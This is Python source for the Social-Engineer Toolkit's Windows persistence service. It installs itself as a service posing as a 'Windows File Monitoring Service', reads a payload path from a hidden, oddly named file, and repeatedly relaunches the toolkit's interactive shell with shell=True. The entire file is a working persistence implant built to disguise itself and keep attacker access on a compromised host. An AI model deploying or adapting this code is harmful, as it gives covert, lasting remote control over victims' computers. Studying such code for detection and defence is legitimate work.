#!/usr/bin/python
#
##########################################################################
#
#                               Social-Engineer Toolkit Persistence Service
#
# Right now this is a pretty lame attempt at a service but will grow over time. The text file it reads in from isn't
# really a good idea, but it's a start.
#
##########################################################################
#
# ex usage: persistence.exe install, start, stop, remove
#
# You can see output of this program running python site-packages\win32\lib\win32traceutil for debugging
#
##########################################################################

import win32service
import win32serviceutil
import win32event
import win32evtlogutil
import win32traceutil
import servicemanager
import winerror
import time
import sys
import os
import subprocess


class aservice(win32serviceutil.ServiceFramework):
    _svc_name_ = "windows_monitoring"
    _svc_display_name_ = "Windows File Monitoring Service"
    _svc_deps_ = ["EventLog"]

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.isAlive = True

    def SvcStop(self):
        # tell Service Manager we are trying to stop (required)
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        # set the event to call
        win32event.SetEvent(self.hWaitStop)
        self.isAlive = False

    def SvcDoRun(self):
        import servicemanager
        # wait for beeing stopped ...
        self.timeout = 1000  # In milliseconds (update every second)
        while self.isAlive:
            # wait for service stop signal, if timeout, loop again
            rc = win32event.WaitForSingleObject(self.hWaitStop, self.timeout)
            # expand the filesystem path
            windir = os.environ['WINDIR']
            # grab homepath
            homedir_path = os.getenv("SystemDrive")
            homedir_path = homedir_path + "\\Program Files\\Common Files\\"
            # pull the windows operating system version number
            windows_version = sys.getwindowsversion()[2]
            # pull integer of version number
            windows_version = int(windows_version)
            # windows XP and below
            if windows_version < 3791:
                fileopen = open("%s\\system32\\isjxwqjs" % (windir), "r")
            # windows 7, vista, 2008, etc. that might have UAC so we write to
            # AppData instead
            if windows_version > 3791:
                fileopen = open("%s\\isjxwqjs" % (homedir_path), "r")
            for line in fileopen:
                # pull set-path, this is pulled from interactive shell and
                # written when persistence is called
                set_path = line.rstrip()
            # specify filename to execute the SET interactive shell
            subprocess.Popen('%s' % (set_path), shell=True, stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # sleep 30 mins
            time.sleep(1800)
            self.ReportServiceStatus(win32service.SERVICE_STOPPED)
        return

if __name__ == '__main__':

    # f its called with arguments then run
    if len(sys.argv) == 1:
        try:
            evtsrc_dll = os.path.abspath(servicemanager.__file__)
            servicemanager.PrepareToHostSingle(aservice)
            servicemanager.Initialize('aservice', evtsrc_dll)
            servicemanager.StartServiceCtrlDispatcher()
        except win32service.error as details:
            if details[0] == winerror.ERROR_FAILED_SERVICE_CONTROLLER_CONNECT:
                win32serviceutil.usage()
    else:
        win32serviceutil.HandleCommandLine(aservice)
